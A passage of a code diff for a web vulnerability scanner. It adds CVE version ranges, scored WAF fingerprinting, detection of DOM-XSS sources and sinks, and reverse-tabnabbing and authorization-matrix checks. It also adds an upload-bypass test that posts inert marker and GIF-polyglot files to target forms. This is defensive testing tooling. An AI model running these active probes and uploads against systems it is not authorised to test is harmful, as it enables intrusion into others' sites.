+            conn.request("GET", path, headers={"User-Agent": "VANTHEX/1.9.0"})
             r = conn.getresponse()
             body = r.read(20000).decode("utf-8", "replace")
             conn.close()
@@ -1607,11 +2586,66 @@ CVE_RANGES = [
      "WordPress before 5.8.3 is vulnerable to SQL injection via WP_Query (CVE-2022-21661)."),
     ("GitLab", ">=11.9,<13.10.3", "CVE-2021-22205", "CRITICAL", 10.0,
      "GitLab CE/EE in this range is vulnerable to the ExifTool unauthenticated RCE (CVE-2021-22205); per-branch fixes: 13.10.3 / 13.9.6 / 13.8.8."),
+    # --- WS4 (v1.10.0): rentang terkurasi lintas ekosistem. Semua tetap
+    # CANDIDATE; syarat yang tidak bisa diverifikasi dari URL ditulis
+    # eksplisit di teks kandidatnya.
+    ("Tomcat", ">=9.0.0,<9.0.31", "CVE-2020-1938", "HIGH", 7.5,
+     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
+    ("Tomcat", ">=8.5.0,<8.5.51", "CVE-2020-1938", "HIGH", 7.5,
+     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
+    ("Tomcat", ">=7.0.0,<7.0.100", "CVE-2020-1938", "HIGH", 7.5,
+     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
+    ("Tomcat", ">=11.0.0,<=11.0.2", "CVE-2025-24813", "HIGH", 8.6,
+     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
+    ("Tomcat", ">=10.1.0,<=10.1.34", "CVE-2025-24813", "HIGH", 8.6,
+     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
+    ("Tomcat", ">=9.0.0,<=9.0.98", "CVE-2025-24813", "HIGH", 8.6,
+     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
+    ("Jetty", ">=9.4.0,<9.4.41", "CVE-2021-28169", "MEDIUM", 5.3,
+     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
+    ("Jetty", ">=10.0.0,<10.0.3", "CVE-2021-28169", "MEDIUM", 5.3,
+     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
+    ("Jetty", ">=11.0.0,<11.0.3", "CVE-2021-28169", "MEDIUM", 5.3,
+     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
+    ("Spring Boot", ">=2.6.0,<2.6.6", "CVE-2022-22965", "CRITICAL", 9.8,
+     "Spring4Shell (CVE-2022-22965) applies via the Spring Framework bundled by Spring Boot 2.6.0-2.6.5 (Framework 5.3.0-5.3.17). Preconditions NOT verifiable from the scanned URL: JDK 9+, WAR deployment on Tomcat, spring-webmvc in use, and a DataBinder-bound controller endpoint. Version range only — verify manually."),
+    ("Spring Boot", ">=2.5.0,<2.5.12", "CVE-2022-22965", "CRITICAL", 9.8,
+     "Spring4Shell (CVE-2022-22965) applies via the Spring Framework bundled by Spring Boot 2.5.0-2.5.11 (Framework 5.2.0-5.2.19). Preconditions NOT verifiable from the scanned URL: JDK 9+, WAR deployment on Tomcat, spring-webmvc in use, and a DataBinder-bound controller endpoint. Version range only — verify manually."),
+    ("Express (Node.js)", "<4.20.0", "CVE-2024-43796", "MEDIUM", 6.1,
+     "Express before 4.20.0 does not properly sanitize untrusted input passed to response.redirect() (CVE-2024-43796), enabling XSS when user input reaches a redirect. Version range only — verify manually."),
+    ("Next.js", ">=11.1.4,<12.3.5", "CVE-2025-29927", "HIGH", 9.1,
+     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
+    ("Next.js", ">=13.0.0,<13.5.9", "CVE-2025-29927", "HIGH", 9.1,
+     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
+    ("Next.js", ">=14.0.0,<14.2.25", "CVE-2025-29927", "HIGH", 9.1,
+     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
+    ("Next.js", ">=15.0.0,<15.2.3", "CVE-2025-29927", "HIGH", 9.1,
+     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
+    ("Laravel", ">=8.0.0,<8.4.2", "CVE-2021-3129", "CRITICAL", 9.8,
+     "Laravel in the CVE-2021-3129 range (Ignition RCE). Preconditions NOT verifiable from the scanned URL: the facade/ignition debug package installed AND APP_DEBUG enabled. Version range only — verify manually."),
+    ("Drupal", ">=7.0.0,<7.58", "CVE-2018-7600", "CRITICAL", 9.8,
+     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
+    ("Drupal", ">=8.4.0,<8.4.6", "CVE-2018-7600", "CRITICAL", 9.8,
+     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
+    ("Drupal", ">=8.5.0,<8.5.1", "CVE-2018-7600", "CRITICAL", 9.8,
+     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
+    ("Django", ">=3.2.0,<3.2.4", "CVE-2021-35042", "HIGH", 8.9,
+     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
+    ("Django", ">=3.1.0,<3.1.13", "CVE-2021-35042", "HIGH", 8.9,
+     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
+    ("Django", ">=2.2.0,<2.2.24", "CVE-2021-35042", "HIGH", 8.9,
+     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
 ]
 
 _NVD_TOKENS = {"WordPress": "wordpress", "Apache": "apache",
                "jQuery": "jquery", "PHP": "php", "nginx": "nginx",
-               "OpenSSL": "openssl"}
+               "OpenSSL": "openssl",
+               "Tomcat": "tomcat", "Spring Boot": "spring boot",
+               "Jetty": "jetty", "Node.js": "node.js",
+               "Express (Node.js)": "express", "Next.js": "next.js",
+               "Django": "django", "Laravel": "laravel",
+               "Ruby on Rails": "rails", "Drupal": "drupal",
+               "GeneXus": "genexus"}
 
 
 def _spec_match(ver, spec):
@@ -1727,6 +2761,50 @@ def c_cve_candidates(ctx, add):
               evidence=r.body[:140], cwe="CWE-200", owasp="A05:2021", cvss=7.5,
               remed='Secure the actuator with Spring Security; expose only health/info.',
               confidence="confirmed", location="/actuator"))
+        # WS5 (v1.10.0, K1): /actuator/info di-parse OPOR TUNISTIK —
+        # hanya di sini, hanya karena /actuator SUDAH terkonfirmasi
+        # terbuka pada target yang sama (bukan probe standar baru).
+        # Versi yang ditemukan adalah versi BUILD APLIKASI (metadata
+        # build milik aplikasi), BUKAN versi framework Spring Boot —
+        # dilabeli persis seperti itu dan tidak dipakai untuk CVE.
+        try:
+            ir = ctx.client.get("/actuator/info")
+            if ir.status == 200 and not ctx.is_missing(ir):
+                info = json.loads(ir.body or "")
+                if isinstance(info, dict) and any(
+                        k in info for k in ("build", "git", "app")):
+                    bld = info.get("build") or {}
+                    appd = info.get("app") or {}
+                    gitd = info.get("git") or {}
+                    bv = bld.get("version") or appd.get("version")
+                    commit = ((gitd.get("commit") or {}).get("id")
+                              if isinstance(gitd.get("commit"), dict)
+                              else gitd.get("commit"))
+                    if bv:
+                        add(F("INFO",
+                              "Spring Boot application build version "
+                              f"via /actuator/info: {bv}",
+                              "The exposed /actuator/info endpoint "
+                              "publishes the application's own build "
+                              "metadata. This is the APPLICATION build "
+                              "version — it is NOT a Spring Boot or "
+                              "framework version and must not be used "
+                              "for framework CVE matching.",
+                              evidence=(f"build.version={bv}"
+                                        + (f"; git commit {commit}"
+                                           if commit else "")),
+                              cwe="CWE-215", owasp="A05:2021",
+                              cvss=0.0,
+                              remed='Restrict /actuator/info like the '
+                                    'other actuator endpoints.',
+                              confidence="confirmed",
+                              location="/actuator/info"))
+                        for t in techs:
+                            if t["name"] == "Spring Boot":
+                                t["app_build_version"] = str(bv)
+                                break
+        except Exception:
+            pass
     for path, sev, title, remed in [
             ("/phpmyadmin/", "MEDIUM", 'phpMyAdmin exposed',
              'Restrict via IP/VPN or remove from production.'),
@@ -1761,45 +2839,17 @@ def c_cve_candidates(ctx, add):
 # tuduhan "F5 BIG-IP" palsu. Aturan di sini: pola 1-2 karakter dan nama vendor
 # telanjang di body DILARANG; setiap pola harus khas vendor, dan bukti yang
 # cocok (header/snippet) dicatat di evidence agar FP berikutnya mudah dilacak.
-WAF_HDR_SIGNS = [
-    (r"cf-ray|cf-cache-status|__cf_bm|server:\s*cloudflare", "Cloudflare"),
-    (r"x-sucuri|server:\s*sucuri", "Sucuri"),
-    (r"visid_incap|incap_ses|x-iinfo", "Imperva/Incapsula"),
-    (r"x-akamai|akamaighost|akamai-grn", "Akamai"),
-    (r"x-amzn-waf|awswaf", "AWS WAF"),
-    (r"bigipserver|set-cookie:\s*ts[0-9a-f]{6,}=|x-wa-info|\bbig-?ip\b", "F5 BIG-IP"),
-    (r"x-barracuda|barracuda", "Barracuda"),
-    (r"server:\s*fortigate|fortiweb|x-fw-", "FortiWeb"),
-]
-WAF_BODY_SIGNS = [
-    (r"attention required!?\s*\|\s*cloudflare|cloudflare ray id|error 1015|error 1020",
-     "Cloudflare"),
-    (r"sucuri website firewall|access denied - sucuri", "Sucuri"),
-    (r"mod_?security|modsecurity|this error was generated by mod_security", "ModSecurity"),
-    (r"incapsula incident|powered by incapsula|\bimperva\b", "Imperva/Incapsula"),
-    (r"akamaighost|reference #18\.[a-f0-9]+\.[a-f0-9]+", "Akamai"),
-    (r"aws waf|amazon waf", "AWS WAF"),
-    (r"the requested url was rejected|f5 networks|\bbig-ip\b", "F5 BIG-IP"),
-    (r"barracuda web application firewall|barracuda networks", "Barracuda"),
-    (r"fortiweb|fortigate", "FortiWeb"),
-]
-
-
-def _waf_match(headers, body):
-    """Cocokkan indikator WAF. headers: list[(k, v)]; body: str.
-    Return (vendor, deskripsi indikator) atau None. Fungsi murni — unit-testable."""
-    hdr = " ".join(f"{k}: {v}" for k, v in headers).lower()
-    for pat, name in WAF_HDR_SIGNS:
-        m = re.search(pat, hdr)
-        if m:
-            return name, f"header ~ '{m.group(0)[:60]}'"
-    b = (body or "")[:6000].lower()
-    for pat, name in WAF_BODY_SIGNS:
-        m = re.search(pat, b)
-        if m:
-            i = max(0, m.start() - 30)
-            return name, f"body ~ '...{b[i:m.end() + 30].strip()[:90]}...'"
-    return None
+# WS3 (v1.4.0): signature tables formalized into SCORED DATA RULES in
+# wafscore.py — {scope, anchored pattern, vendor, score, label},
+# max-merge per vendor, +0.05 blocking-status boost (cap 1.0), display
+# floor 0.3. Vendor names in ordinary body text score 0.25 by
+# construction, so the F5 incident class (naming a vendor from a bare
+# substring/name mention) cannot recur; score + constituent signals
+# are mandatory parts of the finding evidence.
+def _waf_match(headers, body, status=None):
+    """Backward-compatible scored match: (vendor, evidence) for the
+    best vendor at/above the display floor, else None. Pure function."""
+    return wafscore.match(headers, body, status=status)
 
 
 WAF_BLOCK_STATUSES = {403, 406, 409, 411, 419, 451, 501, 999}
@@ -1830,13 +2880,17 @@ def _waf_behavior_verdict(probes):
 
 
 def c_waf_detection(ctx, add):
-    """Deteksi WAF berbasis PERILAKU (v3.5) — bukan tebakan nama:
+    """Deteksi WAF berbasis PERILAKU (v3.5) + fingerprint BERSKOR (WS3):
     kirim payload serangan (XSS/SQLi/LFI) dan kontrol jinak ke path yang PASTI
     tidak ada di aplikasi. Aplikasi tidak punya apa pun untuk diblokir di path
     hantu itu, jadi blocking diferensial (serangan diblokir, kontrol lolos)
     membuktikan ada lapisan inspeksi di depan aplikasi. Nama vendor hanya
-    disebut sebagai INDIKASI terpisah bila ada artefak khas vendor, dan tidak
-    pernah menjadi dasar klaim keberadaan WAF."""
+    disebut bila skor fingerprint-nya (aturan data wafscore, max-merge,
+    lantai tampil 0.3) mencukupi, dan skor + sinyal penyusunnya WAJIB masuk
+    evidence. Bila perilaku memblokir terbukti tanpa sinyal vendor apa pun,
+    hasilnya 'Unknown WAF' (skor provokasi 0.40) — dengan dua pengecualian:
+    blokir yang hanya 429 + Retry-After (itu rate limiting) dan status yang
+    sama dengan baseline kontrol (itu perilaku aplikasi, bukan WAF)."""
     home = ctx.client.get("/")
     mk = ctx.marker
     ghost = f"/ptk-ghost-{mk}"
@@ -1852,30 +2906,58 @@ def c_waf_detection(ctx, add):
     for kind, path in probes_spec:
         r = ctx.client.get(path)
         probes.append({"kind": kind, "status": r.status or 0,
-                       "body": (r.body or "")[:1500]})
+                       "body": (r.body or "")[:1500],
+                       "headers": list(r.headers),
+                       "retry_after": bool(r.hdr("retry-after"))})
     v = _waf_behavior_verdict(probes)
     stat_txt = ", ".join(f"{p['kind']}:{p['status']}" for p in probes)
-    vendor = _waf_match(list(home.headers), home.body or "")
-    ctx.L(f"  [waf] behavior: {v['blocked_attacks']}/{v['total_attacks']} attacks blocked, controls blocked {v['blocked_controls']}; vendor indication: {vendor[0] if vendor else '-'}")
+    # Scored fingerprint: home response MERGED (max) with every blocked
+    # attack response — block pages themselves often carry the vendor.
+    scored = wafscore.score_waf(list(home.headers), home.body or "",
+                                status=home.status)
+    for p in probes:
+        if p["kind"] == "attack" and p["status"] in wafscore.BLOCK_STATUSES:
+            scored = wafscore.merge_scored(
+                scored, wafscore.score_waf(p["headers"], p["body"],
+                                           status=p["status"]))
+    vendor = wafscore.best_vendor(scored)
+    ctx.L(f"  [waf] behavior: {v['blocked_attacks']}/{v['total_attacks']} attacks blocked, controls blocked {v['blocked_controls']}; vendor: "
+          + (f"{vendor['vendor']} score {vendor['score']:.2f}" if vendor else "-"))
     note = ("Scan results may be suppressed (payloads blocked) — negative findings on this target must be read as 'not confirmed', not 'clean'.")
     if v["confirmed"]:
         title = 'WAF confirmed (measured blocking behavior)'
         ev = f"probe path-hantu: {stat_txt}"
         if vendor:
-            title += f" — vendor indication: {vendor[0]}"
-            ev += f"; {vendor[1]}"
+            title += f" \u2014 vendor indication: {vendor['vendor']}"
+            ev += f"; {wafscore.evidence_str(vendor)}"
         add(F("INFO", title,
               'The inspection layer in front of the application PROVABLY blocks attack payloads on paths that do not exist in the application, while benign control requests pass. ' + note,
               evidence=ev, cwe="CWE-693", owasp="A05:2021", cvss=0.0,
               remed='No action required — scan accuracy context information.',
               confidence="confirmed", location="/"))
     elif vendor:
-        add(F("INFO", f"WAF indication: {vendor[0]} (behavior not yet confirmed)",
-              'A vendor-specific artifact was found, but the blocking behavior test does not prove active inspection — treat it as an indication, not a certainty. ' + note,
-              evidence=f"{vendor[1]}; probe: {stat_txt}", cwe="CWE-693",
+        add(F("INFO", f"WAF indication: {vendor['vendor']} (behavior not yet confirmed)",
+              'A vendor fingerprint scored at/above the display floor, but the blocking behavior test does not prove active inspection — treat it as an indication, not a certainty. ' + note,
+              evidence=f"{wafscore.evidence_str(vendor)}; probe: {stat_txt}", cwe="CWE-693",
               owasp="A05:2021", cvss=0.0,
               remed='No action required — scan accuracy context information.',
               confidence="probable", location="/"))
+    else:
+        # Provocation path: blocking behavior without any vendor signal.
+        ctl_statuses = {p["status"] for p in probes if p["kind"] == "control"}
+        blocked_atk = [p for p in probes if p["kind"] == "attack"
+                       and p["status"] in wafscore.BLOCK_STATUSES
+                       and p["status"] not in ctl_statuses]
+        hard_blocked = [p for p in blocked_atk
+                        if not (p["status"] == 429 and p["retry_after"])]
+        if hard_blocked:
+            sts = ", ".join(sorted({str(p["status"]) for p in hard_blocked}))
+            add(F("INFO", "Unknown WAF (blocking behavior, no vendor signature)",
+                  'Attack probes were blocked on non-existent paths while benign controls were not, but no vendor fingerprint scored above the display floor — the inspection layer is reported as an UNKNOWN WAF rather than guessed. ' + note,
+                  evidence=f"provocation score {wafscore.UNKNOWN_WAF_SCORE:.2f}; blocked attack statuses: {sts}; controls: {sorted(ctl_statuses)}; probe: {stat_txt}",
+                  cwe="CWE-693", owasp="A05:2021", cvss=0.0,
+                  remed='No action required — scan accuracy context information.',
+                  confidence="probable", location="/"))
 
 
 DOM_SOURCES = [r"location\.(search|hash|href)", r"document\.(URL|documentURI|referrer)",
@@ -1887,7 +2969,11 @@ DOM_SINKS = [r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write(?:ln)?\s*
 
 def c_dom_xss(ctx, add):
     """DOM XSS statis: file JS same-host yang memuat SOURCE (location.search/hash/dll)
-    DAN SINK berbahaya (innerHTML/document.write/eval) dalam file yang sama = probable."""
+    DAN SINK berbahaya (innerHTML/document.write/eval) dalam file yang sama = probable.
+    WS2 v1.4.0: blok <script> INLINE kini juga dianalisis, diekstrak dari
+    DOM TER-PARSE (lxml — bukan regex di atas HTML mentah); tetap probable,
+    karena analisis statis tidak membuktikan aliran data — jalur konfirmasi
+    DOM XSS adalah eksekusi headless."""
     surf = ctx.surface(full=True)
     home = surf.homepage or ctx.client.get("/")
     srcs = [s for s in re.findall(r'''<script[^>]+src\s*=\s*["']([^"']+)["']''',
@@ -1905,6 +2991,40 @@ def c_dom_xss(ctx, add):
                   owasp="A03:2021 Injection", cvss=7.4,
                   remed='Use textContent, not innerHTML/document.write, for data from URLs; sanitize with DOMPurify.',
                   confidence="probable", location=src))
+    # ---- inline <script> blocks, extracted from the PARSED DOM
+    seen_pages = []
+    for pg in ["/"] + list(surf.pages or [])[:5]:
+        pth = pg.split("?")[0]
+        if pth in seen_pages:
+            continue
+        seen_pages.append(pth)
+        try:
+            r = ctx.client.get(pth)
+        except Exception:
+            continue
+        if r.status != 200 or not r.body:
+            continue
+        root = xssverify._parse(r.body)
+        if root is None:
+            continue
+        for el in xssverify._iter_elements(root):
+            if xssverify._tag(el) != "script":
+                continue
+            if (xssverify._attrs(el).get("src") or "").strip():
+                continue  # external file — covered by the loop above
+            code = xssverify._text(el)
+            if not code or len(code) < 20:
+                continue
+            srcs_hit = [p for p in DOM_SOURCES if re.search(p, code)]
+            sinks_hit = [p for p in DOM_SINKS if re.search(p, code)]
+            if srcs_hit and sinks_hit:
+                add(F("HIGH", f"DOM-based XSS indication in inline script: {pth}",
+                      f"An inline <script> block on this page (extracted from the parsed DOM) reads user-controlled input ({srcs_hit[0]}) and writes to a dangerous sink ({sinks_hit[0]}) — a classic DOM XSS combination. Static analysis does not prove the data flow is connected; manual verification in a browser is still required.",
+                      evidence=f"inline script: source={srcs_hit[0]} sink={sinks_hit[0]}", cwe="CWE-79",
+                      owasp="A03:2021 Injection", cvss=7.4,
+                      remed='Use textContent, not innerHTML/document.write, for data from URLs; sanitize with DOMPurify.',
+                      confidence="probable", location=pth))
+                break
 
 
 WP_PLUGINS = {
@@ -2188,6 +3308,96 @@ def c_sri_and_session(ctx, add):
               confidence="confirmed", location="/"))
 
 
+def _rel_tokens(rel):
+    return {t.lower() for t in re.split(r"\s+", rel or "") if t}
+
+
+def _tabnab_is_vulnerable(target, rel, href, host):
+    """Satu tautan rentan tabnabbing bila: target=_blank, href lintas-origin
+    absolut/protocol-relative, dan rel tanpa noopener maupun noreferrer."""
+    if (target or "").strip().lower() != "_blank":
+        return False
+    h = (href or "").strip()
+    if not h or h.startswith(("#", "javascript:", "data:", "mailto:", "tel:")):
+        return False
+    low = h.lower()
+    if low.startswith("//"):
+        ext_host = urlparse("https:" + h).hostname
+    elif low.startswith(("http://", "https://")):
+        ext_host = urlparse(h).hostname
+    else:
+        return False  # tautan relatif = same-host, di bawah kendali pemilik
+    if not ext_host or ext_host == host:
+        return False
+    toks = _rel_tokens(rel)
+    return "noopener" not in toks and "noreferrer" not in toks
+
+
+def _tabnab_links_in(body, host):
+    """Daftar href rentan tabnabbing dalam satu body halaman.
+    Parser BeautifulSoup bila tersedia, fallback regex (pola crawler.py)."""
+    out = []
+    try:
+        from bs4 import BeautifulSoup
+        soup = BeautifulSoup(body or "", "html.parser")
+        for a in soup.find_all("a"):
+            href = a.get("href") or ""
+            if _tabnab_is_vulnerable(a.get("target") or "", " ".join(a.get("rel") or []), href, host):
+                out.append(href)
+        return out
+    except Exception:
+        pass
+
+    def _attr(tag, name):
+        m = re.search(name + r'''\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))''', tag, re.I)
+        return next((x for x in m.groups() if x is not None), "") if m else ""
+
+    for tag in re.findall(r"<a\b[^>]*>", body or "", re.I):
+        href = _attr(tag, "href")
+        if _tabnab_is_vulnerable(_attr(tag, "target"), _attr(tag, "rel"), href, host):
+            out.append(href)
+    return out
+
+
+def c_tabnabbing(ctx, add):
+    """Reverse tabnabbing (Priority 1): tautan eksternal target=_blank tanpa
+    rel=noopener/noreferrer di halaman-halaman hasil crawl (maks 10).
+    Satu temuan teragregasi per scan."""
+    surf = ctx.surface(full=True)
+    pages = []
+    home = surf.homepage or ctx.client.get("/")
+    if home is not None and (home.body or ""):
+        pages.append(("/", home.body))
+    for p in list(surf.pages):
+        if len(pages) >= 10 or ctx.cancelled():
+            break
+        path = p.split("?")[0]
+        if path == "/" or any(pp == path for pp, _ in pages):
+            continue
+        r = ctx.client.get(p)
+        if r.status == 200 and (r.body or ""):
+            pages.append((path, r.body))
+    total = 0
+    examples = []
+    for path, body in pages:
+        if ctx.cancelled():
+            return
+        hits = _tabnab_links_in(body, ctx.client.host)
+        if hits:
+            ctx.L(f"  [tabnabbing] {path}: {len(hits)} vulnerable links")
+            total += len(hits)
+            for h in hits:
+                if len(examples) < 5:
+                    examples.append((path, h))
+    if total:
+        add(F("LOW", f"Reverse tabnabbing: {total} external target=_blank links without rel=noopener",
+              'External links that open in a new tab (target=_blank) lack rel="noopener"/"noreferrer", so the opened page can reach window.opener and redirect this tab (e.g. to a phishing clone). Modern browsers (Chrome 88+, Firefox 79+, Safari) have applied rel=noopener implicitly for target=_blank links since around 2021, so this is not automatically exploitable in a current browser; the risk remains real for older browsers and embedded WebViews (mobile/desktop apps opening links), and the explicit rel attribute is the defense-in-depth fix. The confirmed claim is the presence of the markup pattern, proven in the served HTML.',
+              evidence="; ".join(f"{p} -> {h}" for p, h in examples)[:300],
+              cwe="CWE-1022", owasp="A05:2021 Security Misconfiguration", cvss=3.7,
+              remed='Add rel="noopener noreferrer" to every external target="_blank" link; enforce it in the template/component that renders links.',
+              confidence="confirmed", location=examples[0][0] if examples else "/"))
+
+
 def c_auth_surface(ctx, add):
     """Permukaan autentikasi: form login via HTTP polos, autocomplete password,
     dan form upload? (upload di check tersendiri)."""
@@ -2253,6 +3463,88 @@ def c_upload_surface(ctx, add):
                   cwe="CWE-434", owasp="A01:2021", cvss=8.6,
                   remed='Require upload authentication+authorization; whitelist types; store outside the webroot.',
                   confidence="confirmed", location=action))
+        # ---- WS5 (v1.8.0): bypass verification with benign canary
+        # markers ONLY (decision K3). No executable code is ever
+        # uploaded — the verdict comes from the SERVING CONTEXT of an
+        # inert marker file, never from code execution.
+        def _up(fname2, part_ctype, content2, marker_s):
+            b2 = f"----PTK{ctx.marker}B"
+            mp2 = (f"--{b2}\r\nContent-Disposition: form-data; "
+                   f"name=\"file\"; filename=\"{fname2}\"\r\n"
+                   f"Content-Type: {part_ctype}\r\n\r\n{content2}\r\n"
+                   f"--{b2}--\r\n")
+            r = ctx.client.post(
+                action, data=mp2,
+                headers={"Content-Type":
+                         f"multipart/form-data; boundary={b2}"})
+            urls = []
+            for murl in re.findall(r'(?:href|src)\s*=\s*["\']([^"\']+)',
+                                   r.body or "", re.I):
+                if fname2 in murl:
+                    urls.append(urlparse(murl).path
+                                if murl.startswith("http") else murl)
+            for d in (f"/uploads/{fname2}", f"/files/{fname2}",
+                      f"/media/{fname2}", f"/static/uploads/{fname2}",
+                      f"/upload/{fname2}"):
+                if d not in urls:
+                    urls.append(d)
+            for u in urls[:6]:
+                g = ctx.client.get(u)
+                if g.status == 200 and marker_s in (g.body or ""):
+                    return u, g
+            return None, None
+
+        artifacts = []
+        m_html = f"PTK-UPLOAD-MARKER-{ctx.marker}-HTML"
+        u1, g1 = _up(f"ptk-{ctx.marker}.html", "text/plain",
+                     f"<html><body>{m_html}</body></html>", m_html)
+        if u1:
+            artifacts.append(u1)
+            served = (g1.hdr("content-type") or "").lower()
+            if "text/html" in served:
+                add(F("HIGH", f"Upload validation bypass: HTML marker file served as HTML: {action}",
+                      'A benign HTML marker file, uploaded with a deliberately mismatched declared content type, is served back with Content-Type text/html — the same path stores attacker-controlled HTML/scripts (stored XSS / defacement primitive). The marker contains no executable code; the verdict is purely the serving context.',
+                      evidence=f"{u1} retrievable with the canary marker, served as {served}",
+                      cwe="CWE-434", owasp="A01:2021 Broken Access Control",
+                      cvss=7.5,
+                      remed='Validate extension AND sniffed content server-side; serve uploads with Content-Disposition: attachment and X-Content-Type-Options: nosniff, ideally from a separate origin.',
+                      confidence="confirmed", location=action))
+            else:
+                add(F("MEDIUM", f"Upload accepts an HTML file (served inertly as {served or 'unknown'}): {action}",
+                      'An HTML marker file passed upload validation but is served with a non-HTML content type, so it is not directly executable in a browser context. Validation still accepts content outside an image/document whitelist.',
+                      evidence=f"{u1} retrievable with the canary marker, served as {served or 'unknown'}",
+                      cwe="CWE-434", owasp="A01:2021 Broken Access Control",
+                      cvss=5.3,
+                      remed='Whitelist extensions and verify content signatures server-side.',
+                      confidence="probable", location=action))
+        m_gif = f"PTK-UPLOAD-MARKER-{ctx.marker}-GIF"
+        u2, _g2 = _up(f"ptk-{ctx.marker}.gif", "image/gif",
+                      "GIF89a;" + m_gif, m_gif)
+        if u2:
+            artifacts.append(u2)
+            add(F("MEDIUM", f"Upload polyglot/mismatch file publicly reachable: {action}",
+                  'A GIF-header polyglot marker file (declared image/gif; the body after the header is plain marker text) was accepted and is publicly retrievable — header/extension checks alone are not stopping non-image content.',
+                  evidence=f"{u2} retrievable with the canary marker",
+                  cwe="CWE-434", owasp="A01:2021 Broken Access Control",
+                  cvss=5.3,
+                  remed='Re-encode images server-side; verify full content signatures, not just magic bytes.',
+                  confidence="probable", location=action))
+        # Cleanup attempt: delete what the endpoint lets us delete;
+        # whatever remains is recorded as a test artifact in the scan
+        # metadata (and the log), never silently left undocumented.
+        left = []
+        for u in artifacts:
+            try:
+                ctx.client.request("DELETE", u)
+            except Exception:
+                pass
+            g = ctx.client.get(u + "?ptkdel=1")
+            if g.status == 200 and ctx.marker in (g.body or ""):
+                left.append(u)
+        if left:
+            ctx.check_meta.setdefault("upload_artifacts", []).extend(left)
+            ctx.L(f"  [upload] {len(left)} benign test artifact(s) could "
+                  f"not be deleted and remain at: {', '.join(left)}")
 
 
 SERIAL_SIGNS = [
@@ -2454,6 +3746,127 @@ def c_bola_matrix(ctx, add):
     ctx.L(f"  [bola] replayed {checked} readable object URLs across accounts")
 
 
+_BFLA_PATH_RE = re.compile(
+    r"(admin|manage|settings|users|roles|permissions|console|internal|"
+    r"moderator|backoffice)", re.I)
+_BFLA_KNOWN = ["/admin", "/admin/users", "/api/admin/users",
+               "/api/admin", "/manage", "/management/users"]
+
+
+def _bfla_access(resp, ctx):
+    """Classify one response to a privileged-function request:
+    "granted" (real content served), "denied" (authentication wall),
+    "other" (missing/error — no authorization signal either way)."""
+    if resp is None or not resp.status:
+        return "other"
+    if resp.status in (401, 403):
+        return "denied"
+    if 300 <= resp.status < 400:
+        loc = resp.hdr("location").lower()
+        return "denied" if ("login" in loc or "signin" in loc
+                            or "auth" in loc) else "other"
+    if resp.status != 200 or not resp.body or ctx.is_missing(resp):
+        return "other"
+    low = resp.body.lower()
+    if 'type="password"' in low and ("sign in" in low or "log in" in low
+                                     or "login" in low):
+        return "denied"          # login wall served with HTTP 200
+    return "granted"
+
+
+def c_bfla_matrix(ctx, add):
+    """WS3 (v1.8.0): Broken Function Level Authorization matrix.
+    Privileged-function endpoints (crawl surface + a short known list)
+    are replayed with the primary session, a second credential set
+    (opts auth_b, the BOLA infrastructure) and anonymously. Confirmed
+    needs the full three-way pattern: the second identity reads
+    content equivalent to the primary session WHILE anonymous access
+    is denied — an anonymous-equivalent result is a public page, not
+    a finding. The full matrix (including healthy rows) is recorded
+    in the scan metadata. Without a second credential set the matrix
+    is partial (primary vs anonymous) and says so."""
+    from netclient import Client as _Client
+    surf = ctx.surface(full=True)
+    cands, seen = [], set()
+    for p in ([x.split("?")[0] for x in surf.pages]
+              + [x.split("?")[0] for x in surf.param_urls]
+              + [f["action"] for f in surf.forms] + _BFLA_KNOWN):
